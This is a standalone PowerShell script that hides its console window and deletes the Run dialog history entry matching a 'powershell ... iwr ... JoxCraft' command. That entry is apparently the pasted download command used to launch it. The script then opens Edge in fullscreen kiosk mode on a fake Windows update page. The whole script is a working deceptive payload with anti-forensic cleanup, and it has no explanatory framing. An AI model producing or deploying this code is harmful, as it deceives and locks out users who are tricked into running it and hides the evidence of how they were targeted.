$null = Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] 
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] 
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
' -PassThru
$hwnd = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($hwnd, 0) | Out-Null

$kioskUrl = "https://fakeupdate.net/win10ue/"

function Clear-RunHistory {
    Start-Sleep -Milliseconds 500
    
    $runPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
    if (Test-Path $runPath) {
        $mruList = (Get-ItemProperty -Path $runPath).MRUList
        $entries = Get-ItemProperty -Path $runPath
                foreach ($key in $mruList.ToCharArray()) {
            $value = $entries.$key
            if ($value -match 'powershell.*iwr.*JoxCraft') {
                Remove-ItemProperty -Path $runPath -Name $key -ErrorAction SilentlyContinue
                break
            }
        }
    }
}

Clear-RunHistory

$kioskUrl = "https://fakeupdate.net/win10ue"

Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList @(
    "-NoProfile",
    "-ExecutionPolicy", "Bypass",
    "-Command",
    "Start-Sleep -Seconds 3; Start-Process 'msedge.exe' '--kiosk $kioskUrl --edge-kiosk-type=fullscreen --no-first-run'"
)

exit
